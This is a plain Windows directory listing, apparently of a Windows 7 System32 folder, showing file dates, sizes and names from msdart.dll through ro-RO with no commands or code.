14/07/2009  01:41           163,840 msdart.dll
14/07/2009  00:28             8,192 msdatsrc.tlb
14/07/2009  01:41           451,584 msdelta.dll
21/11/2010  03:23            35,840 msdmo.dll
21/11/2010  03:24           552,960 msdri.dll
04/12/2013  02:26           528,384 msdrm.dll
14/07/2009  01:39         1,076,736 msdt.exe
14/07/2009  03:20    <DIR>          Msdtc
14/07/2009  01:39           141,824 msdtc.exe
14/07/2009  01:41           368,640 msdtckrm.dll
14/07/2009  01:41           124,928 msdtclog.dll
14/07/2009  01:41           745,472 msdtcprx.dll
21/11/2010  03:23         1,509,888 msdtctm.dll
14/07/2009  01:41           302,080 msdtcuiu.dll
14/07/2009  01:29            21,504 msdtcVSp1res.dll
21/11/2010  03:24            75,776 MSDvbNP.ax
21/11/2010  03:24             5,120 msdxm.ocx
13/07/2009  20:49            43,520 msdxm.tlb
14/07/2017  18:04           801,280 msfeeds.dll
14/07/2017  18:04            52,224 msfeedsbs.dll
14/07/2017  18:04            13,312 msfeedssync.exe
21/11/2010  03:24           799,744 msftedit.dll
14/07/2009  01:39            26,112 msg.exe
14/07/2009  01:38            14,848 msg711.acm
14/07/2009  01:38            29,184 msgsm32.acm
14/07/2017  18:04            13,824 mshta.exe
14/07/2017  18:04        24,917,504 mshtml.dll
14/07/2017  18:04         2,724,864 mshtml.tlb
14/07/2017  18:04            88,064 MshtmlDac.dll
14/07/2017  18:04            92,160 mshtmled.dll
14/07/2017  18:04            48,640 mshtmler.dll
14/07/2017  18:04         1,359,360 mshtmlmedia.dll
04/05/2016  17:17         3,244,032 msi.dll
14/07/2009  01:41            44,544 MsiCofire.dll
14/07/2009  01:41           662,528 msidcrl30.dll
14/07/2009  01:41            64,512 msident.dll
14/07/2009  01:41            11,264 msidle.dll
14/07/2009  01:29             4,608 msidntld.dll
30/10/2013  02:32           335,360 msieftp.dll
04/05/2016  15:04           128,512 msiexec.exe
04/05/2016  17:17           504,320 msihnd.dll
14/07/2009  01:41            19,968 msiltcfg.dll
14/07/2009  01:41             8,192 msimg32.dll
04/05/2016  17:17            25,088 msimsg.dll
14/07/2009  01:41            41,984 msimtf.dll
21/11/2010  03:23           378,880 msinfo32.exe
14/07/2009  01:41            27,136 msisip.dll
14/07/2017  18:04           247,808 msls31.dll
15/07/2015  18:10            11,264 msmmsp.dll
08/12/2015  19:07         1,307,136 msmpeg2adec.dll
08/12/2015  19:07         1,160,192 MSMPEG2ENC.DLL
08/12/2015  19:07         2,777,088 msmpeg2vdec.dll
21/11/2010  03:24           325,632 msnetobj.dll
21/11/2010  03:24           288,256 MSNP.ax
02/09/2016  15:30            60,416 msobjs.dll
14/07/2009  01:41           246,272 msoeacct.dll
14/07/2009  01:41           112,640 msoert2.dll
14/07/2009  01:39         6,676,480 mspaint.exe
14/07/2009  01:41            46,592 mspatcha.dll
21/11/2010  03:24           571,904 mspbda.dll
14/07/2009  01:41            54,272 MsPbdaCoInst.dll
14/07/2009  01:41            53,248 msports.dll
14/07/2009  01:29             2,048 msprivs.dll
14/07/2009  01:39           651,264 msra.exe
14/07/2009  01:41           133,120 msrahc.dll
13/07/2009  23:31             7,168 MsraLegacy.tlb
14/07/2017  18:04           199,680 msrating.dll
14/07/2009  01:41           188,416 msrdc.dll
14/07/2009  01:41            51,712 MsRdpWebAccess.dll
21/11/2010  03:24            16,384 msrle32.dll
04/05/2011  05:22            75,264 msscntrs.dll
21/11/2010  03:24           641,024 msscp.dll
14/07/2009  01:41           252,928 mssha.dll
14/07/2009  01:29           268,800 msshavmsg.dll
14/07/2009  01:41            14,848 msshooks.dll
14/07/2009  01:41            50,688 mssign32.dll
14/07/2009  01:41             8,192 mssip32.dll
14/07/2009  01:41           115,200 mssitlb.dll
14/07/2017  18:04           940,032 MsSpellCheckingFacility.exe
04/05/2011  05:22           491,520 mssph.dll
04/05/2011  05:22           288,256 mssphtb.dll
14/07/2009  01:41           100,352 mssprxy.dll
04/05/2011  05:22         2,223,616 mssrch.dll
04/05/2011  05:22           778,752 mssvp.dll
14/07/2009  01:41            19,456 msswch.dll
21/11/2010  03:24           238,080 mstask.dll
17/07/2014  02:07         1,118,720 mstsc.exe
10/07/2015  17:51         3,722,752 mstscax.dll
14/07/2009  01:41           235,520 msutb.dll
02/09/2016  15:30           316,416 msv1_0.dll
14/07/2009  01:41            78,336 msvcirt.dll
26/03/2017  19:29            19,112 msvcp110_clr0400.dll
22/10/2015  09:08           690,016 msvcp120_clr0400.dll
14/07/2009  01:41           597,504 msvcp60.dll
26/03/2017  19:29            19,112 msvcr100_clr0400.dll
26/03/2017  19:29            19,112 msvcr110_clr0400.dll
22/10/2015  09:09           993,632 msvcr120_clr0400.dll
16/12/2011  08:46           634,880 msvcrt.dll
14/07/2009  01:41           144,384 msvfw32.dll
21/11/2010  03:24            38,912 msvidc32.dll
21/11/2010  03:24         3,650,560 MSVidCtl.dll
14/07/2009  01:41           397,312 mswmdm.dll
11/05/2016  17:02           327,168 mswsock.dll
27/08/2015  18:18         1,887,232 msxml3.dll
27/08/2015  18:13             2,048 msxml3r.dll
27/08/2015  18:18         2,004,480 msxml6.dll
27/08/2015  18:13             2,048 msxml6r.dll
21/11/2010  03:24            25,600 msyuv.dll
14/07/2009  01:39           133,632 mtstocom.exe
21/11/2010  03:24           372,736 mtxclu.dll
14/07/2009  01:41            29,696 mtxdm.dll
14/07/2009  01:41            10,240 mtxex.dll
16/03/2016  18:50           156,672 mtxoci.dll
12/04/2011  07:45    <DIR>          MUI
21/11/2010  03:24            16,896 muifontsetup.dll
14/07/2009  01:41            12,800 MUILanguageCleanup.dll
14/07/2009  01:39            83,456 MuiUnattend.exe
21/11/2010  03:24            51,712 MultiDigiMon.exe
14/07/2009  01:41           272,384 mycomput.dll
21/11/2010  03:24           143,360 mydocs.dll
21/11/2010  03:24           242,688 Mystify.scr
10/06/2009  20:43            63,411 NAPCLCFG.MSC
21/11/2010  03:24            50,176 NAPCRYPT.DLL
21/11/2010  03:24            72,192 napdsnap.dll
21/11/2010  03:24           133,632 NAPHLPR.DLL
14/07/2009  01:41            68,096 NapiNSP.dll
14/07/2009  01:41            43,520 napipsec.dll
14/07/2009  01:41           212,992 NAPMONTR.DLL
14/07/2009  01:39           329,728 NAPSTAT.EXE
21/11/2010  03:24         1,077,248 Narrator.exe
14/07/2009  01:41            15,360 NativeHooks.dll
21/11/2010  03:24         1,326,080 NaturalLanguage6.dll
15/07/2017  07:54    <DIR>          nb-NO
14/07/2009  01:39            17,920 nbtstat.exe
14/07/2009  01:41            24,064 NcdProp.dll
21/11/2010  03:23            90,112 nci.dll
14/07/2009  01:41            69,120 ncobjapi.dll
14/07/2009  01:38           101,376 ncpa.cpl
02/09/2016  15:30           312,320 ncrypt.dll
21/11/2010  03:24            66,048 ncryptui.dll
03/10/2012  17:44           216,576 ncsi.dll
14/07/2009  01:39            74,752 ndadmin.exe
14/07/2009  01:41            11,264 nddeapi.dll
14/07/2009  02:34    <DIR>          NDF
14/07/2009  01:41           238,592 ndfapi.dll
14/07/2009  01:41            33,280 ndfetw.dll
10/06/2009  20:35               565 NdfEventView.xml
14/07/2009  01:41           128,000 ndfhcdiscovery.dll
14/07/2009  01:41            47,104 ndiscapCfg.dll
14/07/2009  01:41            92,160 ndishc.dll
14/07/2009  01:41            20,480 ndproxystub.dll
14/07/2009  01:38            60,928 ndptsp.tsp
14/07/2009  01:41           117,248 negoexts.dll
14/07/2009  01:39            55,808 net.exe
21/11/2010  03:24           152,064 net1.exe
04/07/2012  22:16            73,216 netapi32.dll
14/07/2009  01:41            18,944 netbios.dll
11/05/2016  15:11            25,088 netbtugc.exe
21/11/2010  03:24         1,689,600 netcenter.dll
14/07/2009  01:39            32,256 netcfg.exe
21/11/2010  03:23           519,680 netcfgx.dll
03/10/2012  17:44           246,272 netcorehc.dll
21/11/2010  03:24           324,096 netdiagfx.dll
03/10/2012  17:44            18,944 netevent.dll
21/11/2010  03:23            48,976 netfxperf.dll
14/07/2009  01:30             2,048 neth.dll
21/11/2010  03:23           165,376 netid.dll
21/11/2010  03:24           215,552 netiohlp.dll
14/07/2009  01:39            26,624 netiougc.exe
21/11/2010  03:24           188,928 netjoin.dll
21/11/2010  03:24           695,808 netlogon.dll
14/07/2009  01:41           360,448 netman.dll
14/07/2009  01:30             2,048 netmsg.dll
21/11/2010  03:24           193,024 netplwiz.dll
14/07/2009  01:39            27,136 Netplwiz.exe
14/07/2009  01:41           475,136 netprof.dll
14/07/2009  01:41           459,776 netprofm.dll
14/07/2009  01:39            90,624 NetProj.exe
14/07/2009  01:41         1,136,640 NetProjW.dll
14/07/2009  01:39            87,040 netsh.exe
21/11/2010  03:23         2,652,160 netshell.dll
14/07/2009  01:39            31,744 NETSTAT.EXE
14/07/2009  01:41           681,984 nettrace.dll
10/06/2009  20:36            21,812 NetTrace.PLA.Diagnostics.xml
21/11/2010  03:24            29,184 netutils.dll
21/11/2010  03:24         1,672,704 networkexplorer.dll
14/07/2009  01:41            53,248 networkitemfactory.dll
14/07/2009  03:20    <DIR>          NetworkList
21/11/2010  03:24         2,146,816 networkmap.dll
21/11/2010  02:52                40 Network_LLU.log
14/07/2009  01:41           313,856 newdev.dll
14/07/2009  01:39            76,288 newdev.exe
15/07/2017  07:54    <DIR>          nl-NL
03/10/2012  17:44            70,656 nlaapi.dll
14/07/2009  01:41           126,976 nlahc.dll
06/12/2014  04:17           303,616 nlasvc.dll
14/07/2009  01:41           200,192 nlhtml.dll
14/07/2009  01:41           179,200 nlmgp.dll
14/07/2009  01:41            13,824 nlmsprep.dll
21/11/2010  03:23            69,120 nlsbres.dll
14/07/2009  01:41         1,623,552 NlsData0000.dll
14/07/2009  01:41         2,725,888 NlsData0001.dll
14/07/2009  01:41         2,093,568 NlsData0002.dll
14/07/2009  01:41         2,093,568 NlsData0003.dll
14/07/2009  01:41         2,137,600 NlsData0007.dll
14/07/2009  01:41         6,270,976 NlsData0009.dll
14/07/2009  01:41         9,772,544 NlsData000a.dll
14/07/2009  01:41         2,413,056 NlsData000c.dll
14/07/2009  01:41         2,491,904 NlsData000d.dll
14/07/2009  01:41         2,093,568 NlsData000f.dll
14/07/2009  01:41         4,636,672 NlsData0010.dll
14/07/2009  01:41         2,777,600 NlsData0011.dll
14/07/2009  01:41         3,604,992 NlsData0013.dll
14/07/2009  01:41         2,093,568 NlsData0018.dll
14/07/2009  01:41         4,625,920 NlsData0019.dll
14/07/2009  01:41         2,093,568 NlsData001a.dll
14/07/2009  01:41         2,093,568 NlsData001b.dll
14/07/2009  01:41         4,637,184 NlsData001d.dll
14/07/2009  01:41         3,231,232 NlsData0020.dll
14/07/2009  01:41         1,921,536 NlsData0021.dll
14/07/2009  01:41         1,921,536 NlsData0022.dll
14/07/2009  01:41         2,093,568 NlsData0024.dll
14/07/2009  01:41         2,093,568 NlsData0026.dll
14/07/2009  01:41         2,095,104 NlsData0027.dll
14/07/2009  01:41         1,921,536 NlsData002a.dll
14/07/2009  01:41         3,231,232 NlsData0039.dll
14/07/2009  01:41         1,921,536 NlsData003e.dll
14/07/2009  01:41         3,231,232 NlsData0045.dll
14/07/2009  01:41         3,231,232 NlsData0046.dll
14/07/2009  01:41         3,231,232 NlsData0047.dll
14/07/2009  01:41         3,231,232 NlsData0049.dll
14/07/2009  01:41         3,231,232 NlsData004a.dll
14/07/2009  01:41         3,231,232 NlsData004b.dll
14/07/2009  01:41         3,231,232 NlsData004c.dll
14/07/2009  01:41         3,231,232 NlsData004e.dll
14/07/2009  01:41         4,635,648 NlsData0414.dll
14/07/2009  01:41         4,636,672 NlsData0416.dll
14/07/2009  01:41         4,636,160 NlsData0816.dll
14/07/2009  01:41         2,093,568 NlsData081a.dll
14/07/2009  01:41         2,093,568 NlsData0c1a.dll
14/07/2009  01:41            31,232 Nlsdl.dll
14/07/2009  01:31        11,722,752 NlsLexicons0001.dll
14/07/2009  01:31         4,164,096 NlsLexicons0002.dll
14/07/2009  01:31         1,452,544 NlsLexicons0003.dll
14/07/2009  01:31        12,038,656 NlsLexicons0007.dll
14/07/2009  01:31         2,628,608 NlsLexicons0009.dll
14/07/2009  01:31         9,892,864 NlsLexicons000a.dll
14/07/2009  01:31         6,237,696 NlsLexicons000c.dll
14/07/2009  01:31         1,722,368 NlsLexicons000d.dll
14/07/2009  01:31         5,654,528 NlsLexicons000f.dll
14/07/2009  01:31         4,175,872 NlsLexicons0010.dll
14/07/2009  01:31         2,466,816 NlsLexicons0011.dll
14/07/2009  01:31         4,981,248 NlsLexicons0013.dll
14/07/2009  01:31         3,331,072 NlsLexicons0018.dll
14/07/2009  01:31         6,781,440 NlsLexicons0019.dll
14/07/2009  01:31         6,014,976 NlsLexicons001a.dll
14/07/2009  01:31         6,585,856 NlsLexicons001b.dll
14/07/2009  01:31         6,346,240 NlsLexicons001d.dll
14/07/2009  01:31         1,236,992 NlsLexicons0020.dll
14/07/2009  01:31         2,136,064 NlsLexicons0021.dll
14/07/2009  01:31         5,499,904 NlsLexicons0022.dll
14/07/2009  01:31         7,964,672 NlsLexicons0024.dll
14/07/2009  01:31         5,791,232 NlsLexicons0026.dll
14/07/2009  01:31         6,224,896 NlsLexicons0027.dll
14/07/2009  01:31             4,096 NlsLexicons002a.dll
14/07/2009  01:31         1,782,272 NlsLexicons0039.dll
14/07/2009  01:31         4,045,824 NlsLexicons003e.dll
14/07/2009  01:31         1,793,536 NlsLexicons0045.dll
14/07/2009  01:31         1,808,896 NlsLexicons0046.dll
14/07/2009  01:31         1,411,072 NlsLexicons0047.dll
14/07/2009  01:31         1,558,016 NlsLexicons0049.dll
14/07/2009  01:31         3,419,136 NlsLexicons004a.dll
14/07/2009  01:31         1,702,912 NlsLexicons004b.dll
14/07/2009  01:31         4,093,440 NlsLexicons004c.dll
14/07/2009  01:31         1,972,736 NlsLexicons004e.dll
14/07/2009  01:31         4,616,192 NlsLexicons0414.dll
14/07/2009  01:31         5,090,816 NlsLexicons0416.dll
14/07/2009  01:31         5,031,936 NlsLexicons0816.dll
14/07/2009  01:31         7,042,560 NlsLexicons081a.dll
14/07/2009  01:31         6,917,120 NlsLexicons0c1a.dll
14/07/2009  01:31         5,071,872 NlsModels0011.dll
21/11/2010  03:24           395,776 nltest.exe
10/06/2009  20:47             1,696 NOISE.CHS
10/06/2009  20:47             1,696 NOISE.CHT
10/06/2009  20:50               741 NOISE.DAT
10/06/2009  20:49             2,060 noise.jpn
10/06/2009  20:47             1,486 noise.kor
10/06/2009  20:47               697 NOISE.THA
14/07/2009  01:31             2,560 normaliz.dll
10/06/2009  21:10            59,342 normidna.nls
10/06/2009  21:10            47,076 normnfc.nls
10/06/2009  21:10            40,566 normnfd.nls
10/06/2009  21:10            67,808 normnfkc.nls
10/06/2009  21:10            61,718 normnfkd.nls
09/07/2015  17:57           193,536 notepad.exe
14/07/2009  01:41            31,744 npmproxy.dll
21/11/2010  03:23            15,360 nrpsrv.dll
14/07/2009  01:41            35,328 nshhttp.dll
21/11/2010  03:24           455,168 nshipsec.dll
12/10/2013  02:30           830,464 nshwfp.dll
14/07/2009  01:41            13,824 nsi.dll
14/07/2009  01:41            25,600 nsisvc.dll
21/11/2010  03:24           109,568 nslookup.exe
02/09/2016  15:34         1,732,864 ntdll.dll
14/07/2009  01:41           152,064 ntdsapi.dll
21/11/2010  03:24           129,536 ntlanman.dll
14/07/2009  01:41            17,920 ntlanui2.dll
14/07/2009  01:41           162,304 ntmarta.dll
02/09/2016  15:35         5,548,264 ntoskrnl.exe
26/06/2016  00:27           344,576 ntprint.dll
25/06/2016  19:53            61,952 ntprint.exe
04/01/2012  10:44           509,952 ntshrui.dll
02/09/2016  15:30            16,384 ntvdm64.dll
04/03/2014  09:44           722,944 objsel.dll
14/07/2017  18:04           147,968 occache.dll
21/11/2010  03:24           161,792 ocsetapi.dll
21/11/2010  03:24           186,368 ocsetup.exe
21/11/2010  03:23           720,896 odbc32.dll
14/07/2009  01:41            28,672 odbc32gt.dll
14/07/2009  01:39            90,112 odbcad32.exe
14/07/2009  01:41            57,344 odbcbcp.dll
21/11/2010  03:23            53,248 odbcconf.dll
14/07/2009  01:39            40,960 odbcconf.exe
13/07/2009  23:14               263 odbcconf.rsp
15/06/2011  10:02           163,840 odbccp32.dll
15/06/2011  10:02           106,496 odbccr32.dll
15/06/2011  10:02           106,496 odbccu32.dll
14/07/2009  01:31           229,376 odbcint.dll
15/06/2011  10:02           212,992 odbctrac.dll
14/07/2009  01:41           303,616 offfilt.dll
07/12/2012  11:20            45,568 oflc-nz.rs
07/12/2012  11:20            23,552 oflc.rs
14/07/2009  01:41         1,336,832 ogldrv.dll
21/11/2010  03:23         2,086,912 ole32.dll
27/08/2011  05:37           331,776 oleacc.dll
14/07/2009  01:41            10,752 oleacchooks.dll
14/07/2009  01:31             4,096 oleaccrc.dll
12/05/2016  17:14           862,208 oleaut32.dll
14/07/2009  01:41           128,000 oledlg.dll
14/07/2009  01:41           129,536 oleprn.dll
14/07/2009  01:31            25,600 oleres.dll
21/11/2010  03:23           235,520 onex.dll
21/11/2010  03:23         1,080,320 onexui.dll
21/11/2010  03:24           221,696 OnLineIDCpl.dll
10/06/2009  21:03               843 onlinesetup.cmd
12/04/2011  07:46    <DIR>          oobe
21/11/2010  03:24           898,560 OobeFldr.dll
21/11/2010  03:24         1,911,808 OpcServices.dll
14/07/2009  01:39            79,872 openfiles.exe
14/07/2009  01:41         1,039,872 opengl32.dll
14/07/2009  01:39            97,792 OptionalFeatures.exe
14/07/2009  01:41            25,088 osbaseln.dll
18/06/2014  02:18           692,736 osk.exe
14/07/2009  01:41             8,192 osuninst.dll
21/08/2012  21:01           245,760 OxpsConverter.exe
14/07/2009  01:41           264,704 P2P.dll
14/07/2009  01:41           581,120 p2pcollab.dll
14/07/2009  01:41           408,064 P2PGraph.dll
14/07/2009  01:39           176,128 p2phost.exe
14/07/2009  01:41           162,304 p2pnetsh.dll
14/07/2009  01:41           438,784 p2psvc.dll
25/10/2014  01:57            77,824 packager.dll
14/07/2009  01:41            13,312 panmap.dll
14/07/2009  01:39            15,360 PATHPING.EXE
14/07/2009  01:41            50,176 pautoenr.dll
14/07/2009  01:41            37,376 pcadm.dll
14/07/2009  01:32             8,704 pcaevts.dll
14/07/2009  01:39             9,728 pcalua.exe
14/07/2009  01:41           186,368 pcasvc.dll
14/07/2009  01:41            97,280 pcaui.dll
14/07/2009  01:39            18,432 pcaui.exe
14/07/2009  01:39            11,264 pcawrk.exe
10/06/2009  21:01               114 pcl.sep
14/07/2009  01:39            13,824 pcwrun.exe
14/07/2009  01:41            36,864 pcwum.dll
14/07/2009  01:40            19,968 pcwutl.dll
21/11/2010  03:24           300,032 pdh.dll
14/07/2009  01:41            58,368 pdhui.dll
14/07/2009  01:41           181,760 PeerDist.dll
14/07/2009  01:41            51,200 PeerDistHttpTrans.dll
14/07/2009  01:41           741,376 PeerDistSh.dll
14/07/2009  01:41         1,361,920 PeerDistSvc.dll
14/07/2009  01:41           131,584 PeerDistWSDDiscoProv.dll
07/12/2012  11:20            20,480 pegi-fi.rs
07/12/2012  11:20            20,480 pegi-pt.rs
07/12/2012  11:19            20,480 pegi.rs
07/12/2012  11:20            44,544 pegibbfc.rs
18/02/2021  15:16           127,420 perfc009.dat
21/11/2010  03:24           658,432 PerfCenterCPL.dll
10/06/2009  20:33           116,288 PerfCenterCpl.ico
14/07/2009  01:41            44,544 perfctrs.dll
14/07/2009  01:00            31,548 perfd009.dat
14/07/2009  01:41            35,328 perfdisk.dll
18/02/2021  15:16           677,056 perfh009.dat
14/07/2009  01:00           291,294 perfi009.dat
21/11/2010  03:24           172,544 perfmon.exe
10/06/2009  20:50           145,519 perfmon.msc
14/07/2009  01:41            23,040 perfnet.dll
14/07/2009  01:41            29,696 perfos.dll
14/07/2009  01:41            38,400 perfproc.dll
18/02/2021  15:16           781,298 PerfStringBackup.INI
09/01/2015  03:14           950,272 perftrack.dll
14/07/2009  01:41            18,944 perfts.dll
14/07/2009  01:28           175,104 phon.ime
14/07/2009  01:41           420,864 PhotoMetadataHandler.dll
21/11/2010  03:25           477,696 PhotoScreensaver.scr
21/11/2010  03:25           409,600 photowiz.dll
14/07/2009  01:41            46,080 pid.dll
14/07/2009  01:41         1,439,232 pidgenx.dll
21/11/2010  03:24            35,328 pifmgr.dll
14/07/2009  01:39            16,896 PING.EXE
14/07/2009  01:28           132,608 pintlgnt.ime
21/11/2010  03:23           199,168 PkgMgr.exe
11/11/2014  03:08           241,152 pku2u.dll
15/07/2017  07:54    <DIR>          pl-PL
21/11/2010  03:24         1,389,056 pla.dll
14/07/2009  01:39             9,216 plasrv.exe
14/07/2009  01:41            84,992 PlaySndSrv.dll
14/07/2009  01:41           748,032 pmcsnap.dll
14/07/2017  18:04            62,464 pngfilt.dll
21/11/2010  03:23         1,808,384 pnidui.dll
14/07/2009  01:32            86,528 pnpsetup.dll
14/07/2009  01:41            12,288 pnpts.dll
14/07/2009  01:41           389,120 pnpui.dll
21/11/2010  03:24            62,976 PnPUnattend.exe
14/07/2009  01:39            36,352 PnPutil.exe
14/07/2009  01:41            93,184 PNPXAssoc.dll
14/07/2009  01:41            55,808 PNPXAssocPrx.dll
14/07/2009  01:41            25,088 pnrpauto.dll
14/07/2009  01:41            78,336 Pnrphc.dll
14/07/2009  01:41            86,016 pnrpnsp.dll
14/07/2009  01:41           327,168 pnrpsvc.dll
12/05/2016  17:14           373,760 polstore.dll
22/07/2016  14:58           142,336 poqexec.exe
21/11/2010  03:24           758,272 PortableDeviceApi.dll
14/07/2009  01:41           125,952 PortableDeviceClassExtension.dll
14/07/2009  01:41            77,824 PortableDeviceConnectApi.dll
21/11/2010  03:24           435,712 PortableDeviceStatus.dll
21/11/2010  03:24           224,256 PortableDeviceSyncProvider.dll
14/07/2009  01:41           219,648 PortableDeviceTypes.dll
14/07/2009  01:41           169,472 PortableDeviceWiaCompat.dll
14/07/2009  01:41           218,624 PortableDeviceWMDRM.dll
14/07/2009  01:41            27,136 pots.dll
21/11/2010  03:24           173,568 powercfg.cpl
14/07/2009  01:39            71,168 powercfg.exe
21/11/2010  03:24           486,400 powercpl.dll
09/01/2015  03:14            29,696 powertracker.dll
14/07/2009  01:41           167,424 powrprof.dll
14/07/2009  01:41           258,048 ppcsnap.dll
30/07/2015  13:13           124,624 PresentationCFFRasterizerNative_v0300.dll
21/11/2010  03:25           320,352 PresentationHost.exe
21/11/2010  03:25           109,928 PresentationHostProxy.dll
10/06/2009  20:31         1,165,664 PresentationNative_v0300.dll
21/11/2010  03:24           176,640 PresentationSettings.exe
18/02/2011  10:51            31,232 prevhost.exe
14/07/2009  01:32            17,408 prflbmsg.dll
14/07/2009  01:39            15,360 print.exe
14/07/2009  01:39            71,680 PrintBrmUi.exe
14/07/2009  01:41            35,840 printfilterpipelineprxy.dll
14/07/2009  01:39           748,544 printfilterpipelinesvc.exe
12/04/2011  07:45    <DIR>          Printing_Admin_Scripts
14/07/2009  01:39            18,944 PrintIsolationHost.exe
21/11/2010  03:24            48,128 PrintIsolationProxy.dll
10/06/2009  21:02           146,389 printmanagement.msc
21/11/2010  03:24         1,050,624 printui.dll
14/07/2009  01:39            61,952 printui.exe
21/11/2010  03:24           183,808 prncache.dll
21/11/2010  03:23           416,256 prnfldr.dll
14/07/2009  01:41           190,976 prnntfy.dll
21/11/2010  03:24           156,160 prntvpt.dll
14/07/2009  01:41            10,240 procinst.dll
14/07/2009  01:41            44,032 profapi.dll
21/11/2010  03:24            33,792 profprov.dll
19/12/2014  03:06           210,432 profsvc.dll
21/11/2010  03:23         1,212,416 propsys.dll
21/11/2010  03:24            31,744 proquota.exe
24/12/2017  02:23                 0 providerFx-log4cpp.log
24/12/2017  02:23                 0 providerFx-log4cpp_rolling.log
21/11/2010  03:24           187,904 provsvc.dll
14/07/2009  01:41           307,200 provthrd.dll
14/07/2009  01:41             9,216 psapi.dll
14/07/2009  01:41            52,224 psbase.dll
10/06/2009  21:01                51 pscript.sep
14/07/2009  01:45            57,424 PSHED.DLL
17/08/2011  05:26           613,888 psisdecd.dll
17/08/2011  05:25           108,032 psisrndr.ax
14/07/2009  01:39           732,672 psr.exe
14/07/2009  01:41            52,736 pstorec.dll
14/07/2009  01:41            36,352 pstorsvc.dll
15/07/2017  07:54    <DIR>          pt-BR
15/07/2017  07:54    <DIR>          pt-PT
14/07/2009  01:41           194,560 puiapi.dll
21/11/2010  03:23           429,568 puiobj.dll
21/11/2010  03:24            55,296 PushPrinterConnections.exe
14/07/2009  01:41            55,296 pwrshplugin.dll
21/11/2010  03:23           266,240 QAGENT.DLL
21/11/2010  03:23           476,160 QAGENTRT.DLL
21/11/2010  03:24            23,040 qappsrv.exe
08/12/2015  19:07           254,464 qasf.dll
21/11/2010  03:23           181,248 qcap.dll
21/11/2010  03:23            79,872 QCLIPROV.DLL
21/11/2010  03:23           250,880 qdv.dll
08/12/2015  19:07           371,712 qdvd.dll
08/12/2015  19:07           624,640 qedit.dll
14/07/2009  01:32           733,184 qedwipes.dll
14/07/2009  01:28           175,104 qintlgnt.ime
21/11/2010  03:23           849,920 qmgr.dll
14/07/2009  01:41            44,544 qmgrprxy.dll
21/11/2010  03:24            26,624 qprocess.exe
21/11/2010  03:23           223,232 QSHVHOST.DLL
21/11/2010  03:23           124,416 QSVRMGMT.DLL
08/12/2015  19:07         1,573,888 quartz.dll
21/11/2010  03:24         2,055,680 Query.dll
21/11/2010  03:24            16,384 query.exe
14/07/2009  01:28           175,104 quick.ime
14/07/2009  01:39            24,064 quser.exe
21/11/2010  03:24           107,520 QUTIL.DLL
14/07/2009  01:41           242,688 qwave.dll
14/07/2009  01:39            28,672 qwinsta.exe
21/11/2010  03:24         1,556,992 RacEngn.dll
14/07/2009  01:41           119,296 racpldlg.dll
21/11/2010  03:24           105,559 RacRules.xml
14/07/2009  01:41            97,792 radardt.dll
14/07/2009  01:41            71,168 radarrs.dll
14/07/2009  03:20    <DIR>          ras
14/07/2009  01:41            16,384 rasadhlp.dll
14/07/2009  01:41           384,512 rasapi32.dll
14/07/2009  01:41            99,328 rasauto.dll
14/07/2009  01:39            17,920 rasautou.exe
14/07/2009  01:41            95,744 rascfg.dll
21/11/2010  03:24           337,920 raschap.dll
10/06/2009  20:59             1,820 rasctrnm.h
14/07/2009  01:41            17,408 rasctrs.dll
14/07/2009  01:41            76,288 rasdiag.dll
14/07/2009  01:39            18,944 rasdial.exe
14/07/2009  01:41           860,672 rasdlg.dll
14/07/2009  01:39           125,952 raserver.exe
14/07/2009  01:41           757,760 rasgcw.dll
14/07/2009  01:41           100,352 rasman.dll
21/11/2010  03:24           344,064 rasmans.dll
14/07/2009  01:41            57,344 rasmbmgr.dll
14/07/2009  01:41           866,816 RASMM.dll
14/07/2009  01:41           248,832 rasmontr.dll
14/07/2009  01:41            41,472 rasmxs.dll
14/07/2009  01:39            42,496 rasphone.exe
14/07/2009  01:41           405,504 rasplap.dll
21/11/2010  03:24           211,456 rasppp.dll
14/07/2009  01:41            29,696 rasser.dll
14/07/2009  01:41            82,432 rastapi.dll
04/09/2014  05:23           424,448 rastls.dll
21/11/2010  03:24            10,240 rdpcfgex.dll
21/11/2010  03:24           210,944 rdpclip.exe
17/02/2012  06:38         1,031,680 rdpcore.dll
17/07/2014  02:07           150,528 rdpcorekmts.dll
21/11/2010  03:24            68,096 rdpd3d.dll
21/11/2010  03:24           274,944 rdpdd.dll
21/11/2010  03:24           147,456 RDPENCDD.dll
21/11/2010  03:24           222,208 rdpencom.dll
21/11/2010  03:24           167,424 rdpendp.dll
14/07/2009  01:32            32,256 RDPREFDD.dll
21/11/2010  03:24            23,040 rdprefdrvapi.dll
26/04/2012  05:41            77,312 rdpwsx.dll
14/07/2009  01:39            40,448 rdrleakdiag.exe
26/04/2012  05:34             9,216 rdrmemptylst.exe
21/11/2010  03:24           313,856 ReAgent.dll
14/07/2009  01:39            20,480 ReAgentc.exe
21/11/2010  03:25           238,080 recdisc.exe
14/07/2009  01:39            12,800 recover.exe
12/04/2011  07:47    <DIR>          Recovery
21/11/2010  03:24           146,944 recovery.dll
14/07/2009  01:39            74,752 reg.exe
21/11/2010  03:23            95,232 regapi.dll
14/07/2009  01:41            49,152 RegCtrl.dll
14/07/2009  01:39            10,240 regedt32.exe
14/07/2009  01:41            14,336 regidle.dll
14/07/2009  01:39            47,104 regini.exe
14/07/2017  18:04            86,016 RegisterIEPKEYs.exe
14/07/2009  01:41           159,232 regsvc.dll
14/07/2009  01:39            19,456 regsvr32.exe
14/07/2009  01:39            69,120 rekeywiz.exe
25/05/2015  18:18            43,008 relog.exe
14/07/2009  01:39           173,056 RelPost.exe
21/11/2010  03:24           153,088 remotepg.dll
14/07/2009  01:38           102,400 remotesp.tsp
13/07/2009  23:31             6,144 rendezvousSession.tlb
21/11/2010  03:24            51,712 repair-bde.exe
14/07/2009  01:39            19,968 replace.exe
08/12/2015  19:07           225,792 RESAMPLEDMO.DLL
21/11/2010  03:24            16,896 reset.exe
14/07/2009  01:39           103,936 resmon.exe
13/07/2009  20:23               714 RestartManager.mof
13/07/2009  20:23               176 RestartManagerUninstall.mof
14/07/2017  14:40    <DIR>          restore
14/07/2009  01:41            86,016 resutils.dll
14/07/2009  01:41           182,784 rgb9rast.dll
21/11/2010  03:24           241,664 Ribbons.scr
21/11/2010  03:24           633,344 riched20.dll
21/11/2010  03:24            10,752 riched32.dll
04/12/2013  02:16           626,176 RMActivate.exe
04/12/2013  02:16           658,432 RMActivate_isv.exe
04/12/2013  02:16           553,984 RMActivate_ssp.exe
04/12/2013  02:16           552,960 RMActivate_ssp_isv.exe
14/07/2009  01:39            16,896 RmClient.exe
14/07/2009  01:32             2,560 rnr20.dll
14/07/2009  03:20    <DIR>          ro-RO
